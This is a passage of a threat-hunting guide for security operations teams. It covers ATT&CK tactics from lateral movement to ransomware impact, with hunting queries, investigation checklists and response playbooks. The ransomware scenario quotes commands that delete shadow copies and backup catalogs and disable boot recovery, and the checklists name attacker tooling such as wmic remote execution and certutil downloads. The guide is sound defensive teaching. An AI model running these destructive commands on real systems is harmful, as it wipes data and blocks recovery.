   □ 8+ discovery commands in < 3 minutes → 🔴 AUTOMATED RECON
   □ This is textbook post-exploitation enumeration
   □ No legitimate user runs all these commands together
   □ Often from Cobalt Strike, Metasploit, or attack scripts

2. IDENTIFY THE USER AND CONTEXT
   □ What user account ran these commands?
   □ Is this user an IT admin? (admins might run some, but not all at once)
   □ What was the parent process? (cmd.exe? powershell.exe? beacon?)
   □ What happened BEFORE these commands? (initial access vector)

3. CHECK FOR PRE-CURSOR ACTIVITY
   □ Was there a phishing email opened by this user?
   □ Was there a malicious document executed?
   □ Was there an exploit or credential dump?
   □ Check process tree: what spawned the command shell?

4. CHECK FOR POST-RECON ACTIVITY
   □ After discovery: did the attacker attempt lateral movement?
   □ Did they target the Domain Admin accounts found?
   □ Did they connect to discovered shares?
   □ Did they attempt to access discovered systems?

5. RESPOND
   □ Isolate the workstation
   □ Kill the command/process chain
   □ Reset the user's credentials
   □ Review all discoveries made — what did attacker learn?
   □ Monitor targeted accounts/systems for access
   □ Create alert for burst of discovery commands
```

**TP Confidence:** 🔴 HIGH — Rapid sequential execution of 8+ recon commands = confirmed post-exploitation enumeration.

#### ✅ True Positive Scenario — BloodHound / SharpHound Collection (T1087 + T1069 + T1482)

**Scenario:** LDAP audit logs show a workstation issuing thousands of LDAP queries in 2 minutes, querying all users, groups, computers, GPOs, and trust relationships. EDR shows `SharpHound.exe` running.

**Investigation Steps:**
```
1. CONFIRM BLOODHOUND USAGE
   □ SharpHound.exe or SharpHound.ps1 detected → 🔴 ATTACK TOOL
   □ Massive LDAP queries for AD objects → AD enumeration
   □ Check for output files: *.json or *.zip (BloodHound data)
   □ BloodHound maps attack paths to Domain Admin → PRE-ATTACK

2. ASSESS WHAT DATA WAS COLLECTED
   □ BloodHound collects: users, groups, computers, sessions, ACLs, trusts
   □ This gives attacker a COMPLETE MAP of AD attack paths
   □ Attacker now knows shortest path to Domain Admin

3. CHECK FOR FOLLOW-UP ATTACKS
   □ Did attacker use discovered attack paths?
   □ Check for Kerberoasting of identified service accounts
   □ Check for ACL abuse (WriteDACL, GenericAll exploitation)
   □ Check for lateral movement to discovered high-value targets

4. RESPOND
   □ Isolate the workstation immediately
   □ Delete SharpHound output files
   □ Reset the compromised user account
   □ Assume attacker has full AD topology knowledge
   □ Review and harden AD attack paths identified by BloodHound
   □ Run BloodHound defensively to find and fix attack paths
   □ Create detection for LDAP enumeration patterns
```

**TP Confidence:** 🔴 CRITICAL — SharpHound/BloodHound execution = attacker mapping AD attack paths for escalation.

---

## 12. TA0008 — Lateral Movement

#### Overview
Adversaries move from the initially compromised system to other systems in the network. Lateral movement is the **bridge** between initial access and reaching high-value targets (domain controllers, file servers, databases).

#### Key Techniques

| Technique ID | Technique | Description | Detection Source |
|-------------|-----------|-------------|-----------------|
| T1021.001 | Remote Desktop Protocol (RDP) | RDP to other systems | Event 4624 Type 10, 1149 |
| T1021.002 | SMB/Windows Admin Shares | Access C$, ADMIN$ shares | Event 5140, 5145 |
| T1021.003 | DCOM | Distributed COM for remote execution | Event 4688, Sysmon 1 |
| T1021.006 | Windows Remote Management (WinRM) | PowerShell remoting | Event 4688, 91, 168 |
| T1570 | Lateral Tool Transfer | Copy tools to remote system | Sysmon 11 (network file creates) |
| T1563 | Remote Service Session Hijacking | Hijack existing RDP/SSH | Event 4778 (session reconnect) |
| T1072 | Software Deployment Tools | Abuse SCCM, GPO, Ansible | Deployment tool logs |
| T1550.002 | Pass the Hash | Use NTLM hash directly | Event 4624 Type 3 (NTLM, NtLmSsp) |
| T1550.003 | Pass the Ticket | Use stolen Kerberos ticket | Event 4768, 4769 anomalies |

#### 🔍 Hunting Queries & What to Look For

| Hunt | Data Source | What to Search |
|------|-------------|---------------|
| PsExec usage | Event 7045, 5145 | Service install "PSEXESVC" + access to ADMIN$ share |
| RDP lateral movement | Event 4624 Type 10 | RDP from workstation-to-workstation (not from jump server) |
| WMI remote execution | Event 4688 | `wmic /node:<remote> process call create` |
| Pass-the-Hash | Event 4624 Type 3 | NTLM auth for admin account from unusual source |
| WinRM remoting | Event 4688, 91 | `Enter-PSSession`, `Invoke-Command` to non-admin targets |
| Admin share access | Event 5140, 5145 | Access to C$, ADMIN$, IPC$ from workstations |
| Tool transfer | Sysmon 11 | Executables written to remote system's Windows\Temp or ProgramData |
| SMB lateral movement | Event 5145 | SMB file access to `\*\C$\Windows\Temp\*.exe` |

#### ✅ True Positive Scenario — PsExec Lateral Movement (T1021.002 + T1569.002)

**Scenario:** Event 7045 fires on multiple servers showing a new service named `PSEXESVC` installed. Event 5145 shows the source workstation accessed `\\server\ADMIN$`. The activity originates from a Finance workstation.

**Investigation Steps:**
```
1. CONFIRM PSEXEC PATTERN
   □ Event 5145: ADMIN$ and IPC$ share access from workstation
   □ Event 7045: Service "PSEXESVC" installed on target → 🔴
   □ PsExec copies itself to ADMIN$ → creates a service → executes
   □ Finance workstation → multiple servers = LATERAL MOVEMENT

2. IDENTIFY THE SCOPE
   □ How many target servers? List all Event 7045 with PSEXESVC
   □ What user account was used? (local admin? domain admin?)
   □ What was the timeline? (how fast was the spread?)
   □ What commands were executed via PsExec?

3. TRACE THE SOURCE
   □ How was the Finance workstation compromised initially?
   □ Was it phishing? Drive-by? Credential reuse?
   □ What credentials does the attacker have?
   □ Check for prior credential dumping activity

4. INVESTIGATE TARGET SERVERS
   □ On each target: what ran after PsExec connected?
   □ Check for data access, credential dumping, persistence
   □ Was ransomware deployed?
   □ Were any servers domain controllers?

5. RESPOND
   □ Isolate the source workstation
   □ Isolate ALL target servers and investigate
   □ Block ADMIN$ share access from workstations (network segmentation)
   □ Reset all credentials used by the attacker
   □ Remove PSEXESVC services from targets
   □ Audit local admin membership across the environment
   □ Implement LAPS (Local Administrator Password Solution)
   □ Create detection for PSEXESVC service installation
```

**TP Confidence:** 🔴 CRITICAL — PSEXESVC service on multiple servers from a workstation = confirmed lateral movement.

#### ✅ True Positive Scenario — RDP Lateral Movement with Stolen Credentials (T1021.001)

**Scenario:** Event 4624 (Logon Type 10 - RDP) shows the Domain Admin account `admin.jdoe` logging into 5 servers from a workstation that this admin has never used before. The logons happen at 11:30 PM on a Saturday.

**Investigation Steps:**
```
1. VERIFY ABNORMAL RDP
   □ Logon Type 10 = RDP for admin.jdoe from unusual workstation → 🔴
   □ 5 servers accessed via RDP in rapid succession
   □ Saturday 11:30 PM = outside business hours
   □ Source workstation not in admin's usual devices → SUSPICIOUS

2. VERIFY WITH THE ADMIN
   □ Contact admin.jdoe via phone (out-of-band)
   □ Was this admin working Saturday night? From that workstation?
   □ If NO → CONFIRMED COMPROMISE of domain admin credentials

3. INVESTIGATE SOURCE WORKSTATION
   □ Who was logged into the source workstation?
   □ How did they obtain admin.jdoe credentials?
   □ Check for credential dumping tools, keylogger artifacts
   □ Check for prior Pass-the-Hash or Kerberoast activity

4. INVESTIGATE TARGET SERVERS
   □ What did the attacker do on each server via RDP?
   □ Check for: data access, tool deployment, credential harvesting
   □ Check for: persistence installation, log clearing
   □ Check clipboard history (RDP clipboard data)
   □ Were any DCs among the targets?

5. RESPOND
   □ Disable admin.jdoe account immediately
   □ Terminate all active RDP sessions
   □ Isolate source workstation and all 5 target servers
   □ Reset admin.jdoe credentials and MFA
   □ Review all actions performed with admin.jdoe creds
   □ Restrict RDP access via Network Level Authentication
   □ Implement PAM (Privileged Access Management) solution
   □ Enforce tiered admin model (admin accounts only from PAWs)
```

**TP Confidence:** 🔴 CRITICAL — Domain Admin RDP from unknown workstation after-hours to multiple servers = confirmed lateral movement with stolen creds.

---

## 13. TA0009 — Collection

#### Overview
Adversaries gather data of interest — emails, documents, databases, credentials — before exfiltrating. Collection activity often indicates the attacker is **nearing their objective**.

#### Key Techniques

| Technique ID | Technique | Description | Detection Source |
|-------------|-----------|-------------|-----------------|
| T1560 | Archive Collected Data | Zip/rar files for exfil | EDR (7z.exe, rar.exe, compress-archive) |
| T1114.001 | Local Email Collection | Access local .pst/.ost files | File access logs, EDR |
| T1114.002 | Remote Email Collection | Access Exchange/O365 mailbox | Exchange audit, Graph API logs |
| T1119 | Automated Collection | Scripts to collect files | EDR, Sysmon 1 |
| T1005 | Data from Local System | Manually browse/copy files | File access logs |
| T1039 | Data from Network Shared Drive | Access file shares | Event 5140, 5145 |
| T1113 | Screen Capture | Screenshot tools | EDR (screenshot utilities) |
| T1125 | Video Capture | Webcam access | EDR, camera API calls |
| T1056.001 | Input Capture: Keylogging | Record keystrokes | EDR, behavioral detection |
| T1213 | Data from Information Repositories | SharePoint, Confluence, wikis | App audit logs |

#### 🔍 Hunting Queries & What to Look For

| Hunt | Data Source | What to Search |
|------|-------------|---------------|
| Mass file archiving | EDR/Sysmon | 7z.exe, rar.exe, zip creating large archives in TEMP or staging dirs |
| Email collection | Exchange audit | Unusual mailbox access, export-mailbox cmdlets, .pst creation |
| Mass file access | Event 5145 | Single user accessing hundreds of files on shares in sequence |
| Staging directories | Sysmon 11 | Large files created in C:\ProgramData, C:\Users\Public, C:\Temp |
| Database dumps | App logs/EDR | mysqldump, pg_dump, sqlcmd with bulk export commands |
| Screenshot tools | EDR | Nircmd, screenshot.exe, or PowerShell screen capture scripts |
| Clipboard theft | EDR | Get-Clipboard in loops, or clipboard monitoring tools |

#### ✅ True Positive Scenario — Data Staging and Archiving (T1560 + T1074)

**Scenario:** EDR alerts that `7z.exe` created a 2.5 GB password-protected archive at `C:\ProgramData\update.7z` on a file server. The archive was created by a service account at 2 AM.

**Investigation Steps:**
```
1. ANALYZE THE ARCHIVING
   □ 7z.exe creating large password-protected archive → 🔴
   □ C:\ProgramData = staging location (not normal for 7z output)
   □ 2 AM + service account = off-hours automated collection
   □ What files were added to the archive? (7z command line args)

2. DETERMINE SOURCE FILES
   □ Check 7z.exe command line for source paths
   □ Were sensitive files/shares included? (Finance, HR, Engineering)
   □ What volume of data was compressed?
   □ Check Sysmon Event 1 for full command line

3. CHECK POST-STAGING
   □ Was the archive moved or copied elsewhere?
   □ Check for exfiltration: upload to cloud, FTP, HTTP POST
   □ Check network logs for large outbound transfers from this server
   □ Is the archive still present on disk?

4. INVESTIGATE THE SERVICE ACCOUNT
   □ What is this service account normally used for?
   □ When was it last used legitimately?
   □ Check authentication logs for unusual access
   □ Was the account compromised?

5. RESPOND
   □ Preserve the archive as forensic evidence
   □ Block the service account immediately
   □ Isolate the file server
   □ Determine if data was exfiltrated
   □ Notify data owners about potential data breach
   □ Check for same pattern on other servers
   □ Review service account permissions (least privilege)
   □ If exfiltrated: initiate breach notification procedures
```

**TP Confidence:** 🔴 CRITICAL — Large password-protected archive created by service account at 2 AM in staging directory = confirmed data collection for exfiltration.

---

## 14. Lateral Movement & Collection — Quick Reference Checklists

### 14.1 Lateral Movement Detection Checklist

```
┌───────────────────────────────────────────────────────────────────────┐
│              LATERAL MOVEMENT HUNTING CHECKLIST                       │
├───────────────────────────────────────────────────────────────────────┤
│                                                                       │
│  RDP ANOMALIES                                                        │
│  □ RDP (4624 Type 10) from workstation to workstation                │
│  □ RDP from non-jump-server sources to servers                       │
│  □ RDP sessions outside business hours                               │
│  □ Admin RDP from unexpected hosts                                   │
│                                                                       │
│  SMB / ADMIN SHARE                                                    │
│  □ Access to C$, ADMIN$, IPC$ from workstations                     │
│  □ PSEXESVC service installation (Event 7045)                        │
│  □ Files written to \\remote\ADMIN$\Temp                            │
│  □ SMB connections from non-IT workstations to servers               │
│                                                                       │
│  WMI / WINRM                                                          │
│  □ wmic /node: process call create from workstations                 │
│  □ PowerShell remoting (Invoke-Command) to non-standard targets     │
│  □ WSMan connections from unexpected sources                         │
│                                                                       │
│  PASS-THE-HASH / PASS-THE-TICKET                                     │
│  □ NTLM auth (4624 Type 3) for privileged accounts from workstations│
│  □ Kerberos ticket anomalies (forged tickets, lifetime mismatch)     │
│  □ Multiple systems authenticated with same credential in sequence   │
│                                                                       │
│  TOOL TRANSFER                                                        │
│  □ Executables copied to remote hosts' TEMP or ProgramData          │
│  □ Certutil/BITSAdmin used to download tools on remote hosts        │
│  □ PowerShell scripts transferred and executed remotely              │
│                                                                       │
└───────────────────────────────────────────────────────────────────────┘
```

### 14.2 Data Collection Detection Checklist

```
┌───────────────────────────────────────────────────────────────────────┐
│              DATA COLLECTION HUNTING CHECKLIST                        │
├───────────────────────────────────────────────────────────────────────┤
│                                                                       │
│  STAGING                                                              │
│  □ Large files in C:\ProgramData, C:\Users\Public, C:\TEMP          │
│  □ Archive creation (7z, rar, zip) with sensitive content            │
│  □ Password-protected archives (evasion of DLP)                      │
│  □ Renamed archives (.docx, .png extensions hiding .7z)             │
│                                                                       │
│  EMAIL COLLECTION                                                     │
│  □ Export-Mailbox or New-MailboxExportRequest in Exchange             │
│  □ .pst file creation on endpoints                                   │
│  □ Graph API access to multiple mailboxes from single app            │
│  □ Inbox forwarding to external addresses                            │
│                                                                       │
│  FILE ACCESS                                                          │
│  □ Single user accessing 100+ files on shared drives rapidly        │
│  □ Access to sensitive directories (Finance, HR, Legal, Engineering) │
│  □ After-hours bulk file access                                      │
│  □ Service accounts accessing file shares they normally don't       │
│                                                                       │
│  DATABASE                                                             │
│  □ Database export commands (mysqldump, bcp, sqlcmd bulk)           │
│  □ Large query result sets exported to file                          │
│  □ Database access from non-application accounts                     │
│                                                                       │
└───────────────────────────────────────────────────────────────────────┘
```

---

*Continued in Part 4 → Command & Control, Exfiltration, Impact — Complete TP Scenarios, Full Investigation Playbooks & Master SOC Checklists*


---

# 🎯 Threat Hunting SOC Guide — Part 4: C2, Exfiltration, Impact & Master Investigation Playbooks

---

# PART 4: C2, EXFILTRATION, IMPACT & COMPLETE SOC INVESTIGATION FRAMEWORKS

---

## 15. TA0011 — Command and Control (C2)

#### Overview
After establishing a foothold, adversaries need a **communication channel** back to their infrastructure to issue commands, receive output, and download additional tools. C2 is the adversary's lifeline — **cutting C2 = cutting the attacker off**.

#### Key Techniques

| Technique ID | Technique | Description | Detection Source |
|-------------|-----------|-------------|-----------------|
| T1071.001 | Application Layer Protocol: Web (HTTP/S) | C2 over HTTP/HTTPS | Proxy logs, SSL inspection |
| T1071.004 | DNS | C2 encoded in DNS queries | DNS logs, passive DNS |
| T1573 | Encrypted Channel | Custom encryption for C2 | Network anomaly, JA3/JA3S |
| T1572 | Protocol Tunneling | Tunnel C2 inside SSH, DNS, ICMP | Deep packet inspection, anomaly |
| T1090.002 | External Proxy | Route C2 through proxies/CDNs | Proxy logs, domain fronting |
| T1105 | Ingress Tool Transfer | Download additional tools via C2 | Proxy, EDR, Sysmon 11 |
| T1571 | Non-Standard Port | C2 on unusual port (443 on HTTP) | Firewall, network anomaly |
| T1568.002 | Dynamic Resolution: DGA | Domain Generation Algorithms | DNS logs, entropy analysis |
| T1102 | Web Service | Use legitimate services (GitHub, Slack, Telegram) for C2 | Proxy, EDR |
| T1132 | Data Encoding | Base64/custom encoding in traffic | Network inspection |

#### 🔍 Hunting Queries & What to Look For

| Hunt | Data Source | What to Search |
|------|-------------|---------------|
| Beaconing | Proxy/Firewall | Regular interval connections (every 60s ± jitter) to same domain/IP |
| DNS tunneling | DNS logs | High volume of TXT/NULL queries, long subdomain labels (>50 chars), high entropy |
| DGA domains | DNS logs | Algorithmically generated domains (high entropy, random characters) |
| Unusual User-Agents | Proxy logs | Non-browser HTTP traffic, custom user-agents, missing standard headers |
| Long DNS queries | DNS logs | Subdomain length > 50 characters (data in subdomain = exfil/C2) |
| JA3 fingerprints | Network sensor | Known malicious JA3 hashes (Cobalt Strike, Metasploit, Sliver) |
| Domain fronting | Proxy/TLS | SNI hostname differs from HTTP Host header |
| C2 via legitimate services | Proxy | Repeated API calls to pastebin, github raw, telegram bots, discord webhooks |

#### ✅ True Positive Scenario — HTTPS Beaconing (T1071.001 + T1573)

**Scenario:** Network anomaly detection identifies a workstation making HTTPS connections to `cdn-static-assets[.]com` every 62-68 seconds for 14 hours. The domain was registered 5 days ago and resolves to a VPS provider.

**Investigation Steps:**
```
1. CONFIRM BEACONING PATTERN
   □ Regular interval (62-68s) = consistent with C2 jitter → 🔴
   □ 14 hours of sustained beaconing = persistent implant
   □ HTTPS on port 443 → encrypted C2 channel
   □ New domain (5 days old) on VPS → throwaway infrastructure

2. DOMAIN/IP ANALYSIS
   □ WHOIS: registration date, registrar, privacy protection
   □ Passive DNS: what other IPs has this domain resolved to?
   □ VirusTotal: any malware samples communicating with this domain?
   □ URLScan.io: what does the website look like?
   □ JA3/JA3S hash: matches known C2 framework? (Cobalt Strike JA3)

3. ENDPOINT INVESTIGATION
   □ What process is making the connections? (Sysmon Event 3)
   □ Is it a legitimate process (svchost, explorer) or malicious binary?
   □ If legitimate process → possible process injection (check Sysmon 8)
   □ Check for parent process and full execution chain
   □ Check for persistence mechanism keeping the beacon alive

4. TLS/SSL INSPECTION
   □ If SSL inspection is available: inspect traffic content
   □ Check for unusual certificate properties (self-signed, short validity)
   □ Check certificate issuer and subject name
   □ Small POST requests (command check-in) → larger responses (commands)

5. RESPOND
   □ Block the domain and IP at firewall/proxy immediately
   □ DO NOT alert the user first — isolate endpoint silently
   □ Capture memory dump of the beaconing process
   □ Isolate the endpoint from the network
   □ Identify the malware/implant type (Cobalt Strike? Custom?)
   □ Search for same domain/IP/JA3 across all endpoints
   □ Check for lateral movement from this host
   □ Full forensic investigation
   □ Add IOCs to threat intel platform
```

**TP Confidence:** 🔴 CRITICAL — Regular beacon interval to new domain on VPS = confirmed C2 communication.

#### ✅ True Positive Scenario — DNS Tunneling C2 (T1071.004)

**Scenario:** DNS monitoring reveals a workstation sending 500+ DNS TXT queries per hour to subdomains of `update-check[.]xyz`. Subdomain labels are 60+ character Base64-encoded strings like: `dGhpcyBpcyBlbmNvZGVkIGRhdGE.update-check[.]xyz`

**Investigation Steps:**
```
1. CONFIRM DNS TUNNELING
   □ 500+ queries/hour to single domain → abnormal → 🔴
   □ Long subdomain labels (60+ chars) with Base64 encoding → DATA IN DNS
   □ TXT record queries → response carries C2 commands
   □ This is textbook DNS tunneling (dnscat2, iodine, Cobalt Strike DNS)

2. DECODE THE DATA
   □ Base64 decode subdomain labels → what data is being sent?
   □ Is it command output? Credential data? File contents?
   □ Check TXT responses → are C2 commands embedded?

3. ENDPOINT INVESTIGATION
   □ What process is generating DNS queries? (Sysmon Event 22 or Event 3)
   □ Is it a known DNS tunneling tool or custom implant?
   □ Check process tree and persistence
   □ When did the tunneling start? (first query timestamp)

4. NETWORK SCOPE
   □ Are other hosts querying the same domain?
   □ Does your DNS server forward to upstream? (queries visible there too)
   □ Calculate total data volume transferred via DNS

5. RESPOND
   □ Block the domain at DNS resolver (sinkhole to internal server)
   □ Isolate the endpoint
   □ Capture the DNS tunneling tool for analysis
   □ Create DNS analytics: flag domains with high query volume + long labels
   □ Consider DNS query length restrictions at resolver
   □ Deploy DNS security solution (DNS firewall/RPZ)
```

**TP Confidence:** 🔴 CRITICAL — High-volume encoded DNS queries to single domain = confirmed DNS tunneling C2.

---

## 16. TA0010 — Exfiltration

#### Overview
The adversary's **end goal** — stealing data out of the organization. Exfiltration can use the C2 channel, alternative protocols, or physical media.

#### Key Techniques

| Technique ID | Technique | Description | Detection Source |
|-------------|-----------|-------------|-----------------|
| T1041 | Exfiltration Over C2 Channel | Use existing C2 to extract data | C2 detection + data volume |
| T1048 | Exfiltration Over Alternative Protocol | FTP, SFTP, DNS, SMTP | Network logs, DLP |
| T1567 | Exfiltration to Cloud Storage | Upload to Dropbox, OneDrive, Mega | Proxy, CASB, DLP |
| T1029 | Scheduled Transfer | Timed data transfers | Network anomaly, schedule |
| T1030 | Data Transfer Size Limits | Small chunks to avoid detection | Network anomaly |
| T1052 | Exfiltration Over Physical Medium | USB, portable drives | USB audit logs, DLP |
| T1537 | Transfer Data to Cloud Account | Upload to attacker's cloud | Cloud audit logs |

#### 🔍 Hunting Queries & What to Look For

| Hunt | Data Source | What to Search |
|------|-------------|---------------|
| Large outbound transfers | Firewall/Proxy | Uploads > 100MB to external IPs/domains, especially after-hours |
| Cloud storage uploads | Proxy/CASB | Bulk uploads to personal Dropbox, Google Drive, Mega.nz |
| DNS exfiltration | DNS logs | Encoded data in subdomain labels (same as DNS C2) |
| Email exfiltration | Email gateway | Emails with large/numerous attachments to personal addresses |
| USB data copy | USB audit/DLP | Large file copies to removable media |
| Encrypted uploads | Proxy | Large HTTPS POSTs to unknown/new domains |
| Scheduled FTP | Firewall | Recurring FTP/SFTP connections to external at same time |

#### ✅ True Positive Scenario — Exfiltration to Cloud Storage (T1567)

**Scenario:** CASB alerts that user `s.contractor` uploaded 4.2 GB of data to a personal Mega.nz account during 1 AM - 3 AM. The data consists of 340 files from the Engineering share.

**Investigation Steps:**
```
1. CONFIRM ABNORMAL UPLOAD
   □ 4.2 GB upload to personal cloud storage → 🔴
   □ Mega.nz = encrypted cloud, popular for exfil
   □ 1-3 AM = outside business hours → suspicious timing
   □ Contractor account accessing Engineering data → policy violation at minimum

2. ANALYZE THE DATA
   □ What 340 files were uploaded? (DLP/CASB file listing)
   □ Classification: PII, trade secrets, source code, financial?
   □ Were files downloaded from Engineering share first? (Event 5145)
   □ Were files staged/archived before upload?

3. INVESTIGATE THE ACCOUNT
   □ Is s.contractor still an active contractor?
   □ Is this their typical work pattern?
   □ Check login history: was the account compromised?
   □ Check for impossible travel or unusual login source
   □ Interview the contractor (via HR/Legal)

4. DETERMINE INTENT: INSIDER THREAT vs. EXTERNAL COMPROMISE
   □ If contractor's account was hacked → external actor using their access
   □ If contractor intentionally exfiltrated → insider threat
   □ Check if contractor gave notice recently or has grievances
   □ Check for other data hoarding behavior in recent weeks

5. RESPOND
   □ Disable the contractor's account immediately
   □ Block Mega.nz at proxy (or at least personal accounts)
   □ Notify Legal, HR, and CISO about potential data breach
   □ Preserve all audit logs as evidence
   □ Request Mega.nz account takedown (through legal channels)
   □ Assess regulatory impact (GDPR, CCPA, export controls)
   □ Initiate incident response for data breach
   □ Review all contractor access permissions
```

**TP Confidence:** 🔴 CRITICAL — 4.2 GB upload to personal cloud at 1 AM by contractor = confirmed data exfiltration.

---

## 17. TA0040 — Impact

#### Overview
Adversaries may **destroy, encrypt, or disrupt** systems and data. This includes ransomware, data wiping, defacement, and denial of service. Impact is the **most visible** tactic — it's when the attack reaches its destructive conclusion.

#### Key Techniques

| Technique ID | Technique | Description | Detection Source |
|-------------|-----------|-------------|-----------------|
| T1486 | Data Encrypted for Impact | Ransomware encryption | EDR, File integrity |
| T1485 | Data Destruction | Delete/overwrite data | EDR, File integrity |
| T1490 | Inhibit System Recovery | Delete shadow copies, backups | Event 4688 (vssadmin, wbadmin) |
| T1489 | Service Stop | Stop critical services | Event 7036 |
| T1491 | Defacement | Modify web content | File integrity, Web monitoring |
| T1561 | Disk Wipe | Wipe MBR or disk content | EDR, Boot sector monitoring |
| T1529 | System Shutdown/Reboot | Force reboot after encryption | Event 1074 |
| T1498 | Network Denial of Service | DDoS attacks | Network monitoring |

#### ✅ True Positive Scenario — Ransomware Pre-Deployment (T1486 + T1490)

**Scenario:** Multiple servers simultaneously execute:
```
vssadmin delete shadows /all /quiet
wmic shadowcopy delete
bcdedit /set {default} recoveryenabled No
wbadmin delete catalog -quiet
```
Followed by a new executable `svc_update.exe` dropping ransom notes named `RECOVER-FILES.txt` in multiple directories.

**Investigation Steps:**
```
1. IMMEDIATE — THIS IS AN ACTIVE RANSOMWARE ATTACK
   □ Shadow copy deletion + recovery disabled = pre-encryption → 🔴 CRITICAL
   □ Ransom note deployment = ACTIVE RANSOMWARE
   □ Time is critical — every second, more files encrypt
   □ ACTIVATE INCIDENT RESPONSE PLAN IMMEDIATELY

2. CONTAIN — FIRST PRIORITY (Minutes matter)
   □ Isolate ALL affected servers from network immediately
   □ Disable the account executing the ransomware
   □ Block the ransomware hash at EDR (auto-quarantine)
   □ Disconnect network segments to prevent spread
   □ Shut down shares (SMB) to prevent lateral encryption
   □ DO NOT shut down encrypted servers (memory forensics possible)

3. SCOPE THE ATTACK
   □ How many servers are affected?
   □ What data has been encrypted? Is it recoverable from backup?
   □ Are backups intact? (attackers often target backups first)
   □ Has the ransomware spread to workstations?
   □ Are domain controllers compromised?

4. INVESTIGATE THE KILL CHAIN
   □ How did the attacker get in? (Initial Access — check past days/weeks)
   □ How long has the attacker been in the environment? (dwell time)
   □ What credentials were compromised?
   □ What persistence was established? (must be removed before recovery)
   □ Was data exfiltrated BEFORE encryption? (double extortion)

5. RESPOND & RECOVER
   □ Engage executive leadership and legal counsel
   □ Contact cyber insurance provider
   □ Engage incident response firm (if needed)
   □ Determine ransom demand and payment policy
   □ Identify ransomware variant (ID Ransomware, check for decryptors)
   □ Begin restoration from clean backups (verify integrity first)
   □ Rebuild compromised systems from clean images
   □ Reset ALL passwords (assume complete credential compromise)
   □ Reset KRBTGT password (twice, 12-hour interval)
   □ Implement all missing security controls before reconnecting
   □ Post-incident: complete lessons learned review
```

**TP Confidence:** 🔴 CRITICAL — Shadow copy deletion + ransom notes = ACTIVE RANSOMWARE ATTACK. Maximum severity.

---

## 18. Master Investigation Playbooks

### 18.1 Full Attack Chain Investigation Playbook

When you discover a confirmed compromise, use this playbook to investigate the **complete kill chain**:

```
┌──────────────────────────────────────────────────────────────────────────┐
│            FULL KILL CHAIN INVESTIGATION PLAYBOOK                        │
├──────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  STEP 1: ESTABLISH TIMELINE                                              │
│  □ When was the FIRST indicator of compromise?                          │
│  □ Build timeline: initial access → current state                       │
│  □ Use SIEM, EDR, and network logs to reconstruct events               │
│  □ Create visual timeline in investigation notes                        │
│                                                                          │
│  STEP 2: IDENTIFY INITIAL ACCESS (TA0001)                               │
│  □ How did the attacker get in? Phishing? Exploit? Stolen creds?       │
│  □ What was the first compromised system/account?                       │
│  □ When exactly did initial access occur?                                │
│                                                                          │
│  STEP 3: MAP EXECUTION (TA0002)                                         │
│  □ What was executed on the first compromised system?                   │
│  □ What tools did the attacker deploy?                                  │
│  □ Was it a known malware family or custom tooling?                     │
│                                                                          │
│  STEP 4: IDENTIFY PERSISTENCE (TA0003)                                  │
│  □ What persistence mechanisms were installed?                           │
│  □ Check: scheduled tasks, services, registry, startup, web shells     │
│  □ ALL persistence must be removed before recovery                      │
│                                                                          │
│  STEP 5: MAP PRIVILEGE ESCALATION (TA0004)                              │
│  □ How did the attacker escalate privileges?                            │
│  □ What is the highest privilege level achieved?                        │
│  □ Are domain admin credentials compromised?                            │
│                                                                          │
│  STEP 6: IDENTIFY CREDENTIAL ACCESS (TA0006)                           │
│  □ Were credentials dumped? Which accounts?                             │
│  □ Was DCSync performed?                                                │
│  □ All compromised credentials must be reset                            │
│                                                                          │
│  STEP 7: MAP LATERAL MOVEMENT (TA0008)                                  │
│  □ What systems did the attacker move to?                               │
│  □ What methods? (RDP, PsExec, WMI, WinRM, PTH)                       │
│  □ Complete inventory of ALL touched systems                            │
│                                                                          │
│  STEP 8: ASSESS DATA IMPACT (TA0009 + TA0010)                          │
│  □ Was data collected/staged?                                           │
│  □ Was data exfiltrated? To where? How much?                            │
│  □ What is the business/regulatory impact?                              │
│                                                                          │
│  STEP 9: CHECK FOR IMPACT (TA0040)                                      │
│  □ Was data destroyed or encrypted?                                     │
│  □ Were recovery mechanisms disabled?                                   │
│  □ What is the operational impact?                                      │
│                                                                          │
│  STEP 10: ERADICATE & RECOVER                                           │
│  □ Remove ALL persistence mechanisms                                    │
│  □ Reset ALL compromised credentials                                    │
│  □ Patch exploited vulnerabilities                                      │
│  □ Rebuild compromised systems                                          │
│  □ Restore from clean backups                                           │
│  □ Verify no attacker access remains                                    │
│  □ Enhanced monitoring for re-compromise                                │
│                                                                          │
└──────────────────────────────────────────────────────────────────────────┘
```

### 18.2 Key Windows Event IDs for Threat Hunting — Quick Reference

| Event ID | Log | Description | MITRE Tactic |
|----------|-----|-------------|--------------|
| **1** (Sysmon) | Sysmon | Process Creation | Execution, Discovery |
| **3** (Sysmon) | Sysmon | Network Connection | C2, Lateral Movement |
| **7** (Sysmon) | Sysmon | Image Loaded (DLL) | Defense Evasion |
| **8** (Sysmon) | Sysmon | CreateRemoteThread | Priv Esc, Defense Evasion |
| **10** (Sysmon) | Sysmon | Process Access | Credential Access |
| **11** (Sysmon) | Sysmon | File Create | Persistence, Collection |
| **13** (Sysmon) | Sysmon | Registry Modification | Persistence, Defense Evasion |
| **22** (Sysmon) | Sysmon | DNS Query | C2, Discovery |
| **1102** | Security | Audit Log Cleared | Defense Evasion |
| **4624** | Security | Successful Logon | Initial Access, Lat. Movement |
| **4625** | Security | Failed Logon | Credential Access (Brute Force) |
| **4648** | Security | Explicit Credential Logon | Lateral Movement |
| **4662** | Security | Object Access (AD) | Credential Access (DCSync) |
| **4672** | Security | Special Privileges Assigned | Privilege Escalation |
| **4688** | Security | Process Creation | Execution, Discovery |
| **4697** | Security | Service Installed | Persistence |
| **4698** | Security | Scheduled Task Created | Persistence |
| **4720** | Security | User Account Created | Persistence |
| **4728/4732** | Security | Member Added to Group | Privilege Escalation |
| **4769** | Security | Kerberos TGS Request | Credential Access |
| **5140** | Security | Network Share Access | Lateral Movement, Collection |
| **5145** | Security | Detailed Share Access | Lateral Movement, Collection |
| **7036** | System | Service State Change | Impact (Service Stop) |
| **7045** | System | Service Installed | Persistence, Lateral Movement |
| **4104** | PowerShell | Script Block Logging | Execution |

### 18.3 IOC Types to Collect and Share

| IOC Type | Examples | Where to Find |
|----------|---------|---------------|
| **IP Addresses** | C2 server IPs, scanner IPs | Firewall, proxy, Sysmon Event 3 |
| **Domains** | C2 domains, phishing domains | DNS logs, proxy, email headers |
| **URLs** | Payload URLs, phishing URLs | Proxy, email body, script content |
